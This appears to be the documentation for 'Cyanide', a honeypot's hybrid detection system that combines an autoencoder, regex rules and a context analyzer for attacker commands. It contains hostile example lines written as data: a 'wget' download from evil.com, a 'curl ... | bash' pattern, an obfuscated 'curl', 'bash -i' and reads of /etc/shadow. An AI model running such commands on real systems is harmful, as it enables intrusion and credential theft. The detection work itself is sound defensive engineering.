# Cyanide Hybrid Detection System

Cyanide employs a **Hybrid Detection System** that fuses three distinct analysis layers to detect malicious activity with high precision and explainability.

## Architecture

The detection pipeline processes every command entered by an attacker through three parallel engines:

1.  **ML Anomaly Detector (Autoencoder)**: Detects *unknown* or *deviant* patterns based on character distribution.
2.  **Security Rule Engine (Regex)**: Detects *known* attack signatures (e.g., `wget`, `curl`, logical operators).
3.  **Context Analyzer**: Evaluates the reputation of referenced files, paths, and URLs.

The results are fused by the `HybridPipeline` using an override logic:
- **ML** provides the baseline anomaly score.
- **Rules** can confirm a specific attack technique (boosting confidence).
- **Context** can elevate a suspicious command to malicious based on touched resources.

---

## Components

### 1. ML Anomaly Detector (`src/cyanide/ml/model.py`)
- **Type**: LSTM/GRU Autoencoder (PyTorch).
- **Input**: Character-level tokenization of the command string.
- **Output**: `Reconstruction Error` (Anomaly Score).
- **Logic**: The model is trained on "normal" hacker commands (bootstrapped from honeypot data). It learns to reconstruct these patterns. High reconstruction error indicates a command structure the model hasn't seen (potential zero-day or obfuscation).

### 2. Knowledge Base (`src/cyanide/ml/classifier.py`)
- **Type**: TF-IDF Vectorizer + Cosine Similarity.
- **Data**: MITRE ATT&CK techniques, CVEs, and known hacker methods.
- **Function**: When an anomaly is detected, the KB attempts to *classify* it by finding the most similar known attack pattern.
- **Output**: MITRE Technique ID (e.g., `T1059.004`), Tactics, and Description.

### 3. Security Rule Engine (`src/cyanide/ml/rule_engine.py`)
- **Type**: Regex-based pattern matcher.
- **Role**: Deterministic detection of high-confidence threats.
- **Rules**: Defined in `src/cyanide/ml/rules.py` (e.g., download utilities, shell pipes, sensitive file access).

### 4. Context Analyzer (`src/cyanide/ml/context_analyzer.py`)
- **Role**: Semantic analysis of arguments.
- **Checks**:
    - **URL Reputation**: Checks domains against blocklists (local/remote).
    - **File Sensitivity**: Flags access to `/etc/shadow`, `/root/.ssh`, etc.

---

## Configuration (`configs/app.yaml`)

The ML system is configured via the `ml` section:

```yaml
ml:
  enabled: true
  
  # Paths
  model_path: assets/models/cyanideML.pkl
  ml_log: var/log/cyanide/cyanideML-log.json
  
  # Training Data
  training_data:
    hacker_methods: "data/raw"          # Directory containing .jsonl command logs
    mitre_cve: "data/processed/kb_ready" # Directory with KB definitions
  
  # Operational Settings
  online_learning: false       # Enable dynamic retraining (experimental)
  retraining_interval_days: 7  # Auto-retrain frequency
```

---

## Training & Management

### 1. Training the Model

To train the Anomaly Detector and build the Knowledge Base:

```bash
# Train from scratch (force retrain)
python3 scripts/training/train.py --train-model --force

# Build/Update Knowledge Base only
python3 scripts/training/train.py --build-kb
```

### 2. Data Format

**Training Data (`data/raw/*.jsonl`)**:
Line-delimited JSON files containing commands.
```json
{"command": "ls -la", "timestamp": "..."}
{"command": "wget http://evil.com/malware", "timestamp": "..."}
```

**Knowledge Base Data (`data/processed/kb_ready/*.json`)**:
JSON definitions of techniques.
```json
{
  "id": "T1059.004",
  "name": "Unix Shell",
  "description": "Adversaries may abuse Unix shell...",
  "examples": ["sh -c", "bash -i"]
}
```

---

## Testing & Verification

Run the comprehensive test suite to validte the hybrid system:

```bash
pytest scripts/management/test_hybrid_system.py
```

This tests:
1.  **Clean Commands**: `ls -la` should be CLEAN.
2.  **Known Attacks**: `curl ... | bash` should be DETECTED (Rule+ML).
3.  **Obfuscation**: `c''u''r''l` should be DETECTED (ML High Error).
4.  **Context**: Accessing `/etc/shadow` should be DETECTED (Context).
